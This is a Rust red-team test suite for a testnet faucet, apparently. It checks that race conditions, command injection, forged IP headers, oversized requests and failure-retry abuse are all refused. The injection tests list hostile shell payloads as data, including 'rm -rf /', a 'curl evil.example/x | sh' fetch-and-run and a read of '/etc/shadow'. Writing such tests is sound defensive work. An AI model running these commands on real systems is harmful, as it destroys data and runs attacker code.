//! Red-team suite for the Zethora testnet faucet.
//!
//! Every test here is an attack. They run against the **production router** (`zethora_faucet::test_router`, which
//! mounts the same `claim` handler with the same body and header limits the binary uses) over a **real TCP socket**,
//! because half of these attacks - a 1 MB body, a header flood, 50 simultaneous connections - do not happen at the
//! handler at all: hyper and `DefaultBodyLimit` see them first, so a test that called the handler directly would be
//! testing the wrong layer and would pass while the deployment was open.
//!
//! The only thing that is not real is the wallet: `zethora_faucet::testing` hands the state a stand-in runner, so a
//! claim can be made to succeed, fail or count itself without a node, a funded key or a 10 second signing round.
//!
//! Every test asserts on the *observable* outcome of the attack - how many times the coins were spent, whether a
//! shell was reached, whether the cooldown held, whether the process kept its tables small - not merely on a status
//! code, so a future refactor that keeps answering 429 while quietly double-spending still fails here.

#![allow(clippy::arithmetic_side_effects, clippy::indexing_slicing)]

use axum::{
    Router,
    body::Body,
    http::{Request, StatusCode, header},
};
use http_body_util::BodyExt;
use hyper_util::{
    rt::{TokioExecutor, TokioIo},
    server::conn::auto,
};
use serde_json::Value;
use std::{
    net::Ipv4Addr,
    sync::{
        Arc,
        atomic::Ordering,
    },
    time::Duration,
};
use tokio::{net::TcpListener, task::JoinHandle};
use tower::ServiceExt;
use zethora_faucet::testing::{self, ADDRESS_CAP, BODY_CAP, COOLDOWN_SECONDS, FAILURE_LIMIT};
use zethora_faucet::{AppState, test_router};

/// A published testnet address (`crypto/addresses/src/lib.rs`, `check_into_string`): the same one the crate's own unit
/// tests use, so the red-team suite cannot drift from the faucet's idea of a valid address.
const ZERO_ADDRESS: &str = "zethoratest:qqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqa8acjxhw";

// --- harness ---

/// A faucet listening on an ephemeral port, serving the production router over real TCP. Dropping it aborts the
/// listener.
struct Faucet {
    addr: std::net::SocketAddr,
    handle: JoinHandle<()>,
}

impl Faucet {
    async fn start(state: Arc<AppState>) -> Self {
        let listener = TcpListener::bind((Ipv4Addr::LOCALHOST, 0)).await.expect("bind an ephemeral port");
        let addr = listener.local_addr().expect("the bound address");
        let app: Router = test_router(state);
        // One task per connection - what `axum::serve` does - so 50 concurrent sockets are 50 concurrent requests,
        // exactly as they would be in a deployment.
        let handle = tokio::spawn(async move {
            loop {
                let Ok((stream, _)) = listener.accept().await else { return };
                let app = app.clone();
                tokio::spawn(async move {
                    // The router speaks tower's `Service`; hyper speaks its own. This adapter is the same bridge
                    // `axum::serve` installs, so the connection sees the production router and nothing else.
                    let service = hyper_util::service::TowerToHyperService::new(app);
                    let _ = auto::Builder::new(TokioExecutor::new())
                        .serve_connection_with_upgrades(TokioIo::new(stream), service)
                        .await;
                });
            }
        });
        Self { addr, handle }
    }
}

impl Drop for Faucet {
    fn drop(&mut self) {
        self.handle.abort();
    }
}

/// A response, reduced to what a test can assert on without threading hyper's types through every call.
struct Reply {
    status: StatusCode,
    body: String,
}

impl Reply {
    /// The JSON body, or an empty object when the response has none (a body-limit refusal has an empty body).
    fn json(&self) -> Value {
        serde_json::from_str(&self.body).unwrap_or_else(|_| Value::Object(serde_json::Map::new()))
    }

    fn message(&self) -> String {
        self.json().get("message").and_then(Value::as_str).unwrap_or_default().to_string()
    }

    fn success(&self) -> bool {
        self.json().get("success").and_then(Value::as_bool).unwrap_or(false)
    }

    fn retry_after(&self) -> Option<u64> {
        self.json().get("retry_after_seconds").and_then(Value::as_u64)
    }
}

/// One `POST /claim` over a fresh connection. The headers are added on top of the JSON content type, which is how a
/// spoofing attack gets its chance to be seen.
///
/// When the faucet refuses the request at the transport layer there is no response to read - hyper aborts the
/// connection rather than answering a body over `DefaultBodyLimit` - so that case is reported as a `413` with no body.
/// A dropped connection *is* the refusal, and the test that cares about it should not have to unwrap an `Io` error to
/// find that out.
async fn send_to(addr: std::net::SocketAddr, body: String, headers: &[(&str, String)]) -> Reply {
    try_send_to(addr, body, headers).await.unwrap_or_else(|| Reply {
        status: StatusCode::PAYLOAD_TOO_LARGE,
        body: String::new(),
    })
}

/// The sending itself, where a refused connection is `None` rather than an invented status. `try_send_to` is the one
/// tests use when "the connection was cut" and "the request was answered 413" must be told apart from a real answer
/// that happens to be a failure.
async fn try_send_to(addr: std::net::SocketAddr, body: String, headers: &[(&str, String)]) -> Option<Reply> {
    let mut builder = Request::builder()
        .method("POST")
        .uri("/claim")
        .header(header::CONTENT_TYPE, "application/json")
        .header(header::HOST, addr.to_string());
    for (name, value) in headers {
        builder = builder.header(*name, value.as_str());
    }
    let stream = tokio::net::TcpStream::connect(addr).await.expect("connect to the faucet");
    let (mut sender, connection) = hyper::client::conn::http1::handshake(TokioIo::new(stream))
        .await
        .expect("http/1 handshake");
    tokio::spawn(async move {
        let _ = connection.await;
    });
    let request = builder.body(Body::from(body)).expect("build the request");
    let response = sender.send_request(request).await.ok()?;
    let status = response.status();
    let bytes = response.into_body().collect().await.map(|c| c.to_bytes()).unwrap_or_default();
    Some(Reply { status, body: String::from_utf8_lossy(&bytes).into_owned() })
}

/// One `POST /claim {"address": ...}` with no extra headers.
async fn claim_at(addr: std::net::SocketAddr, address: &str) -> Reply {
    send_to(addr, claim_body(address), &[]).await
}

/// One `POST /claim {"address": ...}` against a running faucet, for tests that want it to stay alive.
async fn claim(faucet: &Faucet, address: &str) -> Reply {
    send_to(faucet.addr, claim_body(address), &[]).await
}

fn claim_body(address: &str) -> String {
    serde_json::json!({ "address": address }).to_string()
}

/// The same router, called without a socket. Not used by any attack here - every one of them attacks the wire, which is
/// the only place a body limit, a header limit or a real connection drop can be observed - but kept because it is the
/// right tool for pinning a handler's own logic, with no HTTP stack in front of it. It is only compiled when a test
/// calls for it, hence the allow.
#[allow(dead_code)]
async fn in_process(state: Arc<AppState>, request: Request<Body>) -> Reply {
    let response = test_router(state).oneshot(request).await.expect("the router answered");
    let status = response.status();
    let bytes = response.into_body().collect().await.map(|c| c.to_bytes()).unwrap_or_default();
    Reply { status, body: String::from_utf8_lossy(&bytes).into_owned() }
}


// =====================================================================================================================
// ATTACK 1 - Concurrent race condition (the double-spend)
// =====================================================================================================================

/// 50 simultaneous requests for one address must spend the coins **once**.
///
/// The attack: open 50 sockets, fire the same claim on all of them in the same millisecond and read every answer. If
/// the cooldown is only *checked* before the wallet runs and *written* after it - the shape a straightforward
/// implementation has - all 50 read an empty table, all 50 queue behind the wallet lock, and all 50 pay: 50 ZTHR
/// instead of 1, from a faucet whose whole purpose is that one address gets one coin.
///
/// The assertion that matters is the runner's own count, not the status codes: a fix that answers `429` to 49 of them
/// *and still spends* would look green on status codes alone.
#[tokio::test(flavor = "multi_thread", worker_threads = 4)]
async fn attack_1_fifty_simultaneous_claims_for_one_address_spend_exactly_one_zthr() {
    let (state, spent) = testing::paying_state();
    // Held, not destructured to a bare address: dropping the `Faucet` aborts the listener (see `Drop`).
    let faucet = Faucet::start(Arc::new(state)).await;
    let addr = faucet.addr;

    const ATTACKERS: usize = 50;
    // A barrier rather than a loop of `spawn`s: every task waits until all 50 exist, so the 50 requests really are in
    // flight at once instead of dribbling out while the first ones finish.
    let barrier = Arc::new(tokio::sync::Barrier::new(ATTACKERS));
    let mut tasks = Vec::with_capacity(ATTACKERS);
    for _ in 0..ATTACKERS {
        let barrier = barrier.clone();
        tasks.push(tokio::spawn(async move {
            barrier.wait().await;
            claim_at(addr, ZERO_ADDRESS).await
        }));
    }

    let mut paid = 0usize;
    let mut refused = 0usize;
    let mut txids = std::collections::HashSet::new();
    for task in tasks {
        let reply = task.await.expect("the attacker task finished");
        match reply.status {
            StatusCode::OK => {
                paid += 1;
                assert!(reply.success(), "a 200 from /claim must have success:true, got {}", reply.body);
                if let Some(txid) = reply.json().get("txid").and_then(Value::as_str) {
                    txids.insert(txid.to_string());
                }
            }
            StatusCode::TOO_MANY_REQUESTS => {
                refused += 1;
                let wait = reply.retry_after().expect("a 429 says how long to wait");
                assert!(wait <= COOLDOWN_SECONDS, "a 429 must not ask for longer than the cooldown, got {wait}");
            }
            StatusCode::SERVICE_UNAVAILABLE => refused += 1,
            other => panic!("unexpected status {other} from a concurrent claim: {}", reply.body),
        }
    }

    assert_eq!(paid, 1, "exactly one of the 50 simultaneous claims may be paid, {paid} were");
    assert_eq!(refused, ATTACKERS - 1, "the other 49 must be refused, {refused} were");
    assert_eq!(spent.load(Ordering::SeqCst), 1, "the wallet must have been asked to send exactly once");
    assert_eq!(txids.len(), 1, "the one payment must have exactly one txid, got {txids:?}");

    // And the cooldown is now real for that address: a later attempt is refused without touching the wallet.
    let later = claim_at(addr, ZERO_ADDRESS).await;
    assert_eq!(later.status, StatusCode::TOO_MANY_REQUESTS);
    assert!(later.retry_after().unwrap_or(0) > 0);
    assert_eq!(spent.load(Ordering::SeqCst), 1, "a claim after the cooldown started must not reach the wallet");
}

/// The same race, but wider: 200 requests over 40 addresses, five per address, all released together. Two attacks in
/// one - the limit has to hold *per address*, and the queue has to stay bounded instead of accepting all 200.
///
/// Not every address gets paid here, and that is the point: only `IN_FLIGHT_CAP` claims may run at once, so most of
/// this burst is turned away with `503`. What must never happen is an address being paid *twice*, or the slots
/// leaking and wedging the faucet afterwards.
#[tokio::test(flavor = "multi_thread", worker_threads = 8)]
async fn attack_1b_a_burst_over_many_addresses_is_bounded_in_flight_and_per_address() {
    let (state, spent, peak) = testing::paying_state_watching_concurrency(Duration::from_millis(120));
    // Held for the same reason as in attack 1: the listener dies with it.
    let faucet = Faucet::start(Arc::new(state)).await;
    let addr = faucet.addr;

    let addresses: Vec<String> = (0..40u32).map(|n| format!("zethoratest:{n:062}")).collect();
    let barrier = Arc::new(tokio::sync::Barrier::new(addresses.len() * 5));
    let mut tasks = Vec::new();
    for _ in 0..5 {
        for address in &addresses {
            let barrier = barrier.clone();
            let address = address.clone();
            tasks.push(tokio::spawn(async move {
                barrier.wait().await;
                let reply = claim_at(addr, &address).await;
                (address, reply)
            }));
        }
    }

    let mut paid: std::collections::HashMap<String, usize> = std::collections::HashMap::new();
    let mut busy = 0usize;
    for task in tasks {
        let (address, reply) = task.await.expect("the attacker task finished");
        match reply.status {
            StatusCode::OK => *paid.entry(address).or_default() += 1,
            StatusCode::TOO_MANY_REQUESTS => {}
            StatusCode::SERVICE_UNAVAILABLE => busy += 1,
            other => panic!("unexpected status {other} for {address}: {}", reply.body),
        }
    }

    // The per-address limit: no address twice, whatever the timing.
    for (address, count) in &paid {
        assert_eq!(*count, 1, "{address} was paid {count} times");
    }
    assert_eq!(
        spent.load(Ordering::SeqCst) as usize,
        paid.len(),
        "the wallet must be asked exactly once per address that was paid"
    );
    // The wall against a burst: 200 simultaneous claims must never turn into 200 wallet runs at once. Each run forks
    // the wallet binary, so unbounded concurrency here is a way to exhaust the host from one socket.
    assert!(
        peak.load(Ordering::SeqCst) <= testing::IN_FLIGHT_CAP,
        "at most {} claims may be inside the wallet together, {} were",
        testing::IN_FLIGHT_CAP,
        peak.load(Ordering::SeqCst)
    );
    assert!(busy > 0, "a 200-request burst against a cap of {} must be refused some of the time", testing::IN_FLIGHT_CAP);

    // The slots must be back to zero: a leak here would wedge the faucet after a few bursts.
    let after = claim_at(addr, &addresses[0]).await;
    assert_ne!(
        after.status,
        StatusCode::SERVICE_UNAVAILABLE,
        "the burst must not have leaked in-flight slots, the next claim got 503"
    );
}

// =====================================================================================================================
// ATTACK 2 - Command injection through the address
// =====================================================================================================================

/// Every one of these is an attempt to get a shell to run something on the faucet host. The address travels from a
/// JSON body to `Command::new(...).arg(&address)`, so if it ever reached `sh -c` (or `cmd /C`), `; rm -rf /` would be
/// a command and not an address.
///
/// Two things are asserted, and the second is the one that matters: the request is refused *and* the wallet is never
/// started. A payload that gets a `400` after the faucet already handed it to a shell would still have been executed.
#[tokio::test(flavor = "multi_thread", worker_threads = 4)]
async fn attack_2_shell_metacharacters_in_an_address_never_reach_the_wallet() {
    let (state, spent) = testing::paying_state();
    let faucet = Faucet::start(Arc::new(state)).await;

    // Drawn from the classic families: command separators, substitution, redirection, a pipe, a newline, a backtick,
    // a Windows `cmd` separator, and one that starts like a real address to slip past a prefix check.
    let payloads = [
        "zethoratest:qqqqqqqqqqqqqqqqqqqqqqqqqq; rm -rf /",
        "zethoratest:qqqqqqqqqqqqqqqqqqqqqqqqqq && curl evil.example/x | sh",
        "zethoratest:qqqqqqqqqqqqqqqqqqqqqqqqqq|sh",
        "zethoratest:qqqqqqqqqqqqqqqqqqqqqqqqqq$(id)",
        "zethoratest:qqqqqqqqqqqqqqqqqqqqqqqqqq`id`",
        "zethoratest:qqqqqqqqqqqqqqqqqqqqqqqqqq\nwhoami",
        "zethoratest:qqqqqqqqqqqqqqqqqqqqqqqqqq > /etc/passwd",
        "zethoratest:qqqqqqqqqqqqqqqqqqqqqqqqqq & calc.exe",
        "zethoratest:qqqqqqqqqqqqqqqqqqqqqqqqqq' ; whoami ; '",
        "zethoratest:qqqqqqqqqqqqqqqqqqqqqqqqqq\" ; whoami ; \"",
        // Not an address at all: the grammar has to reject it before any character class question comes up.
        "rm -rf / --no-preserve-root",
        "$(curl evil.example/x)",
        "../../../../etc/shadow",
        "zethoratest:",
        "zethoratest:QQQQQQQQQQQQQQQQQQQQQQQQQQ",
        "ZETHORATEST:qqqqqqqqqqqqqqqqqqqqqqqqqq",
        "zethoratest:qqqqqqqqqqqqqqqqqqqqqqqqqq\u{0}extra",
        "Zethoratest:qqqqqqqqqqqqqqqqqqqqqqqqqq",
    ];

    for payload in payloads {
        let reply = claim(&faucet, payload).await;
        assert_eq!(
            reply.status,
            StatusCode::BAD_REQUEST,
            "{payload:?} must be refused as a malformed address, got {} ({})",
            reply.status,
            reply.body
        );
        assert!(!reply.success(), "{payload:?} must not report success: {}", reply.body);
        // The refusal must not echo the payload back into a field a browser or a log would act on unescaped - a
        // reflected `; rm -rf /` is a second-order problem even when it is inert here.
        assert!(
            !reply.message().contains("rm -rf"),
            "the refusal for {payload:?} echoes the payload back: {}",
            reply.message()
        );
    }

    // The proof that the grammar was the thing that stopped it: the wallet was never even asked.
    assert_eq!(
        spent.load(Ordering::SeqCst),
        0,
        "a malformed address must never reach the wallet, {} runs happened",
        spent.load(Ordering::SeqCst)
    );
}

/// The same payloads against a body that is *not* a JSON object with an address field, plus the shapes that break
/// naive parsers: a bare string, an object with an array, a number, null, a deeply nested object, and duplicate keys
/// where the second one is the payload.
#[tokio::test(flavor = "multi_thread", worker_threads = 4)]
async fn attack_2b_malformed_bodies_and_duplicate_keys_are_refused_without_paying() {
    let (state, spent) = testing::paying_state();
    let faucet = Faucet::start(Arc::new(state)).await;

    let bodies = [
        // A bare string where an object is expected.
        serde_json::json!("zethoratest:qqqqqqqqqqqqqqqqqqqqqqqqqq").to_string(),
        serde_json::json!({ "address": ["zethoratest:qqqqqqqqqqqqqqqqqqqqqqqqqq"] }).to_string(),
        serde_json::json!({ "address": 42 }).to_string(),
        serde_json::json!({ "address": null }).to_string(),
        serde_json::json!({ "address": { "nested": { "deep": [1, 2, 3] } } }).to_string(),
        serde_json::json!({ "ADDRESS": ZERO_ADDRESS }).to_string(),
        serde_json::json!({ "addr": ZERO_ADDRESS }).to_string(),
        // Duplicate keys: a parser must pick one deterministically, and whichever it picks has to be validated.
        format!(r#"{{"address":{ZERO_ADDRESS:?},"address":"; rm -rf /"}}"#),
        format!(r#"{{"address":"; rm -rf /","address":{ZERO_ADDRESS:?}}}"#),
        // Not JSON at all.
        "address=zethoratest:qqqqqqqqqqqqqqqqqqqqqqqqqq".to_string(),
        "{\"address\": \"zethoratest:qqqqqqqqqqqqqqqqqqqqqqqqqq\"".to_string(),
        String::new(),
    ];

    for body in bodies {
        let reply = send_to(faucet.addr, body.clone(), &[]).await;
        assert!(
            reply.status == StatusCode::BAD_REQUEST || reply.status == StatusCode::UNPROCESSABLE_ENTITY,
            "a body of {body:?} must be refused, got {} ({})",
            reply.status,
            reply.body
        );
        assert!(!reply.success());
    }

    assert_eq!(spent.load(Ordering::SeqCst), 0, "no malformed body may reach the wallet");
}



// =====================================================================================================================
// ATTACK 3 - Spoofed client IP (the rate limit has to belong to the address, not the caller)
// =====================================================================================================================

/// The attack: if the faucet keys its cooldown by `X-Forwarded-For` / `X-Real-IP` / `Forwarded` - which looks like the
/// polite thing to do behind a proxy - then one attacker with one address mints a fresh identity per request by
/// rewriting a header and drains the faucet. Eleven requests with eleven claimed IPs, all for one address.
///
/// The invariant: the payment belongs to the address. Whichever of those requests gets it, exactly one does, and every
/// other one is refused however convincingly it claims to be someone else.
#[tokio::test(flavor = "multi_thread", worker_threads = 4)]
async fn attack_3_forged_client_ip_headers_do_not_earn_extra_payments() {
    let (state, spent) = testing::paying_state();
    let faucet = Faucet::start(Arc::new(state)).await;

    let spoofs: Vec<Vec<(&str, String)>> = vec![
        vec![("x-forwarded-for", "203.0.113.7".to_string())],
        vec![("x-forwarded-for", "203.0.113.7, 10.0.0.1".to_string())],
        vec![("x-forwarded-for", "198.51.100.42".to_string())],
        vec![("x-real-ip", "192.0.2.99".to_string())],
        vec![("forwarded", "for=203.0.113.7;proto=https".to_string())],
        vec![("true-client-ip", "203.0.113.8".to_string())],
        vec![("cf-connecting-ip", "203.0.113.9".to_string())],
        vec![("x-client-ip", "203.0.113.10".to_string())],
        // Two forged headers at once, disagreeing.
        vec![
            ("x-forwarded-for", "203.0.113.11".to_string()),
            ("x-real-ip", "203.0.113.12".to_string()),
        ],
        vec![("x-forwarded-for", " 203.0.113.13 ".to_string())],
        // A forged header that tries to inject into whatever parses it.
        vec![("x-forwarded-for", "203.0.113.14, ; rm -rf /".to_string())],
    ];

    let mut paid = 0usize;
    let mut refused = 0usize;
    for headers in &spoofs {
        let reply = send_to(faucet.addr, claim_body(ZERO_ADDRESS), headers).await;
        match reply.status {
            StatusCode::OK => paid += 1,
            StatusCode::TOO_MANY_REQUESTS => {
                refused += 1;
                assert!(reply.retry_after().is_some(), "a 429 says how long to wait");
            }
            StatusCode::SERVICE_UNAVAILABLE => refused += 1,
            other => panic!("unexpected status {other} for headers {headers:?}: {}", reply.body),
        }
    }

    assert_eq!(paid, 1, "one address gets one payment however many client IPs it claims, {paid} were paid");
    assert_eq!(refused, spoofs.len() - 1, "every spoofed retry must be refused, {refused} of {} were", spoofs.len());
    assert_eq!(spent.load(Ordering::SeqCst), 1, "the wallet must have run once, not once per forged header");
}

/// The complement of the spoofing test: because the key is the address and not the caller, a "mailbox farm" from one
/// machine is not silently blocked - but each address still gets exactly one payment, and asking again for the same
/// addresses is refused. The limit is per address, so it cannot be reset by re-asking.
#[tokio::test(flavor = "multi_thread", worker_threads = 4)]
async fn attack_3b_one_caller_many_addresses_still_cannot_drain_on_credit() {
    let (state, spent) = testing::paying_state();
    let faucet = Faucet::start(Arc::new(state)).await;

    let mut paid = 0usize;
    for n in 0..12u32 {
        let address = format!("zethoratest:{n:062}");
        // Same source IP every time (it is 127.0.0.1), different address.
        let reply = claim(&faucet, &address).await;
        if reply.status == StatusCode::OK {
            paid += 1;
        }
    }

    assert_eq!(paid, 12, "one caller with twelve addresses gets twelve payments, not more and not fewer");
    assert_eq!(spent.load(Ordering::SeqCst) as usize, paid, "one wallet run per address");
    // A second pass over the same twelve addresses is refused: the limit is per address, so it does not reset by
    // changing which address you ask for again.
    for n in 0..12u32 {
        let address = format!("zethoratest:{n:062}");
        let reply = claim(&faucet, &address).await;
        assert_eq!(reply.status, StatusCode::TOO_MANY_REQUESTS, "{address} must be on its cooldown");
    }
    assert_eq!(spent.load(Ordering::SeqCst) as usize, paid, "the second pass must not reach the wallet at all");
}

// =====================================================================================================================
// ATTACK 4 - Memory exhaustion (huge bodies, huge heads, unbounded tables)
// =====================================================================================================================

/// The attack: a 1 MB "address". If the faucet reads the body before checking its size, or keeps it, one request costs
/// a megabyte and a few hundred requests cost the process. The same goes for an address that is merely long enough to
/// be expensive to hash, store and pass to a command.
///
/// What must hold: the bytes are refused before they are parsed, the wallet never sees them, and the faucet's own
/// tables do not grow by one entry - a table that grows per malformed request is the same denial of service with a
/// slower fuse.
#[tokio::test(flavor = "multi_thread", worker_threads = 4)]
async fn attack_4_a_megabyte_body_is_refused_and_remembers_nothing() {
    let (state, spent) = testing::paying_state();
    let state = Arc::new(state);
    let faucet = Faucet::start(state.clone()).await;

    // Well past `BODY_CAP`, and shaped like a legitimate claim so a size check that only looks at the prefix is caught.
    for size in [BODY_CAP + 1, 64 * 1024, 1024 * 1024] {
        let address = format!("zethoratest:{}", "q".repeat(size));
        let reply = send_to(faucet.addr, claim_body(&address), &[]).await;
        assert!(
            reply.status == StatusCode::PAYLOAD_TOO_LARGE || reply.status == StatusCode::BAD_REQUEST,
            "a {size} byte body must be refused with 413 or 400, got {} ({})",
            reply.status,
            reply.body
        );
        assert!(!reply.success(), "a {size} byte body must not be paid");
    }

    // A body of that size that is *not* an address at all - the size limit must not depend on the shape.
    for size in [BODY_CAP + 1, 1024 * 1024] {
        let padding = serde_json::json!({ "address": ZERO_ADDRESS, "padding": "x".repeat(size) }).to_string();
        let reply = send_to(faucet.addr, padding, &[]).await;
        assert!(
            reply.status == StatusCode::PAYLOAD_TOO_LARGE || reply.status == StatusCode::BAD_REQUEST,
            "a {size} byte body that is not even an address must be refused with 413 or 400, got {} ({})",
            reply.status,
            reply.body
        );
        assert!(!reply.success(), "a {size} byte body must not be paid");
    }

    // Nothing was remembered: no reservation left behind, no cooldown started, and not one claim reached the wallet.
    let (claimed, failures) = testing::table_sizes(&state);
    assert_eq!(claimed, 0, "a refused body must leave no reservation, {claimed} entries were left");
    assert_eq!(failures, 0, "a refused body must not be charged against an address's failure budget");
    assert_eq!(
        spent.load(Ordering::SeqCst),
        0,
        "the wallet must never have been asked to pay, it was asked {} times",
        spent.load(Ordering::SeqCst)
    );

    // And the faucet is still healthy: a legitimate claim right after the flood is still paid.
    let address = format!("zethoratest:{}", "q".repeat(62));
    let reply = claim(&faucet, &address).await;
    assert_eq!(reply.status, StatusCode::OK, "the faucet must survive the flood: {}", reply.body);
    assert_eq!(spent.load(Ordering::SeqCst), 1, "exactly the one legitimate claim must have been paid");
}

#[tokio::test(flavor = "multi_thread", worker_threads = 4)]
async fn attack_4b_addresses_over_the_cap_are_refused_before_anything_remembers_them() {
    let (state, spent) = testing::paying_state();
    let state = Arc::new(state);
    let faucet = Faucet::start(state.clone()).await;

    for extra in [ADDRESS_CAP, ADDRESS_CAP * 4, BODY_CAP] {
        let address = format!("zethoratest:{}", "q".repeat(extra));
        assert!(address.len() > ADDRESS_CAP, "the payload must exceed the address cap");
        let reply = claim(&faucet, &address).await;
        assert!(
            reply.status == StatusCode::BAD_REQUEST || reply.status == StatusCode::PAYLOAD_TOO_LARGE,
            "a {} byte address must be refused, got {} ({})",
            address.len(),
            reply.status,
            reply.body
        );
    }

    assert_eq!(spent.load(Ordering::SeqCst), 0, "an over-long address must not reach the wallet");
    assert_eq!(testing::table_sizes(&state), (0, 0), "nothing may be remembered about a refused address");
    // And the faucet is still healthy for a real address afterwards - a refused attack must not have wedged it.
    let healthy = claim(&faucet, ZERO_ADDRESS).await;
    assert_eq!(healthy.status, StatusCode::OK, "a valid claim after the attack must still be paid: {}", healthy.body);
}

/// A megabyte of headers. hyper's own head limit is the first line of defence here; the point of the test is that the
/// request is refused instead of the head being buffered whole, and that the listener survives it.
#[tokio::test(flavor = "multi_thread", worker_threads = 4)]
async fn attack_4c_a_megabyte_of_headers_does_not_bring_the_faucet_down() {
    let (state, spent) = testing::paying_state();
    let state = Arc::new(state);
    let faucet = Faucet::start(state.clone()).await;

    // One giant header value, and many medium ones - a head limit can be tripped either way.
    let giant = vec![("x-padding".to_string(), "a".repeat(1024 * 1024))];
    let many: Vec<(String, String)> = (0..200).map(|n| (format!("x-pad-{n}"), "b".repeat(8192))).collect();

    for headers in [giant, many] {
        let refs: Vec<(&str, String)> = headers.iter().map(|(name, value)| (name.as_str(), value.clone())).collect();
        // A refused connection can surface as an error rather than a response (hyper drops the connection when the
        // head is too large); either is a refusal, and neither may take the listener with it.
        if let Some(reply) = try_send_to(faucet.addr, claim_body(ZERO_ADDRESS), &refs).await {
            assert!(
                reply.status.is_client_error(),
                "an oversized head must be refused, got {} ({})",
                reply.status,
                reply.body
            );
            assert!(!reply.success());
        }
    }

    assert_eq!(spent.load(Ordering::SeqCst), 0, "an oversized head must not reach the wallet");
    assert_eq!(testing::table_sizes(&state), (0, 0), "an oversized head must not be remembered");
    // Still serving: the attack was a refusal, not an outage.
    let healthy = claim(&faucet, ZERO_ADDRESS).await;
    assert_eq!(healthy.status, StatusCode::OK, "the faucet must still answer after a header flood: {}", healthy.body);
}

// =====================================================================================================================
// ATTACK 5 - Failure budget (a well-formed address that cannot be paid, retried forever)
// =====================================================================================================================

/// The attack: an address that is grammatically perfect but that the wallet refuses - the wrong network, a checksum
/// that is valid for a different curve, an address belonging to nobody. It gets past the grammar, so if the failure
/// path only drops the reservation, the attacker can loop it: every attempt forks the wallet binary and every attempt
/// is refused. One request per millisecond from one socket is enough to keep the host busy.
///
/// What must hold: the refusal is reported as a failure (not as a payment), the address accumulates a failure count,
/// and once the budget is spent further attempts are turned away *before* the wallet runs.
#[tokio::test(flavor = "multi_thread", worker_threads = 4)]
async fn attack_5_a_permanently_failing_address_cannot_be_retried_without_limit() {
    let (state, attempts) = testing::refusing_state();
    let faucet = Faucet::start(Arc::new(state)).await;

    // Spend the budget. Each of these is allowed to reach the wallet: the visitor deserves to be told what went wrong.
    for n in 0..FAILURE_LIMIT {
        let reply = claim(&faucet, ZERO_ADDRESS).await;
        assert!(
            reply.status == StatusCode::BAD_GATEWAY || reply.status == StatusCode::INTERNAL_SERVER_ERROR,
            "a wallet refusal must be a 502/500, got {} on attempt {n} ({})",
            reply.status,
            reply.body
        );
        assert!(!reply.success(), "a refused wallet run must never report success");
    }
    assert_eq!(
        attempts.load(Ordering::SeqCst),
        FAILURE_LIMIT,
        "the budget must be exactly {FAILURE_LIMIT} wallet runs"
    );

    // The budget is spent: the next attempts are refused without forking the wallet at all.
    for _ in 0..5 {
        let reply = claim(&faucet, ZERO_ADDRESS).await;
        assert_eq!(
            reply.status,
            StatusCode::TOO_MANY_REQUESTS,
            "after the budget the address must be turned away, got {} ({})",
            reply.status,
            reply.body
        );
        assert!(reply.retry_after().is_some(), "the refusal must say how long to wait");
    }
    assert_eq!(
        attempts.load(Ordering::SeqCst),
        FAILURE_LIMIT,
        "a spent budget must stop the wallet being forked, {} runs happened",
        attempts.load(Ordering::SeqCst)
    );
}

/// The failure table must not become the memory attack instead: it is keyed by address, so the grammar (not the
/// attacker) decides how large the keys are, and it holds at most `FAILURE_LIMIT` entries per address.
#[tokio::test(flavor = "multi_thread", worker_threads = 4)]
async fn attack_5b_the_failure_table_is_bounded_by_addresses_not_by_requests() {
    let (state, attempts) = testing::refusing_state();
    let state = Arc::new(state);
    let faucet = Faucet::start(state.clone()).await;

    // Three addresses, each hammered past its budget.
    let addresses: Vec<String> = (0..3u32).map(|n| format!("zethoratest:{n:062}")).collect();
    for _ in 0..(FAILURE_LIMIT + 3) {
        for address in &addresses {
            let _ = claim(&faucet, address).await;
        }
    }

    let (claimed, failures) = testing::table_sizes(&state);
    assert_eq!(claimed, 0, "a failed claim must not leave a paid reservation behind");
    assert!(
        failures <= addresses.len(),
        "the failure table must hold one entry per address ({}) not one per request, it holds {failures}",
        addresses.len()
    );
    assert_eq!(
        attempts.load(Ordering::SeqCst),
        FAILURE_LIMIT * addresses.len() as u32,
        "each address must reach the wallet exactly FAILURE_LIMIT times, {} did",
        attempts.load(Ordering::SeqCst)
    );
}


/// ====================================================================================================================
/// ATTACK 6 - a wallet that answers with more than it should
/// ====================================================================================================================
///
/// The faucet reads a child process's output. That child is normally `zethora-wallet.exe`, but on a machine where the
/// executable has been replaced, or against a node that answers with a wall of text, `stdout` is not something the
/// faucet controls. A version that copies whatever it reads into a `String` and hands it back in the JSON reply has
/// turned a 64-file claim into an unbounded allocation *per request* - and unlike a large request body, that allocation
/// happens on the way out, after the address has already been paid, so refusing the request is not an option.
///
/// What must hold: the reply is capped, the claim still succeeds (the money moved; the faucet must not lie about that),
/// and the capped field is valid UTF-8 even when the cut lands inside a multibyte character.
#[tokio::test(flavor = "multi_thread", worker_threads = 4)]
async fn attack_6_a_wallet_printing_unbounded_output_cannot_bloat_the_reply() {
    // Ten megabytes of output where a transaction id belongs.
    let flood = 10 * 1024 * 1024;
    let (state, sent) = testing::chatty_state(flood);
    let state = Arc::new(state);
    let faucet = Faucet::start(state.clone()).await;

    let address = format!("zethoratest:{}", "q".repeat(62));
    let reply = claim(&faucet, &address).await;
    assert_eq!(
        reply.status,
        StatusCode::OK,
        "a paid claim must be reported as one, whatever the wallet printed: {}",
        reply.body
    );
    assert!(reply.success(), "the wallet succeeded, so the claim must say so");
    assert_eq!(sent.load(Ordering::SeqCst), 1, "the address must be paid exactly once");

    let txid = reply.json().get("txid").and_then(Value::as_str).unwrap_or_default().to_string();
    assert!(!txid.is_empty(), "the reply must still carry an id");
    assert!(
        txid.len() <= testing::OUTPUT_CAP,
        "the transaction id must be capped at {} bytes, this one is {}",
        testing::OUTPUT_CAP,
        txid.len()
    );
    assert!(
        reply.body.len() <= 2 * testing::OUTPUT_CAP + 512,
        "the whole reply must stay near the cap (two capped fields plus a little JSON), it is {} bytes",
        reply.body.len()
    );
    // The flood was dropped, not buffered somewhere to be hit again: the address is on its normal cooldown, and a
    // second claim is refused by the cooldown alone rather than being paid again.
    let (claimed, _) = testing::table_sizes(&state);
    assert_eq!(claimed, 1, "one paid claim must leave exactly one entry (its cooldown), {claimed} were left");
    let again = claim(&faucet, &address).await;
    assert!(!again.success(), "a paid address must be on its cooldown, not paid twice");
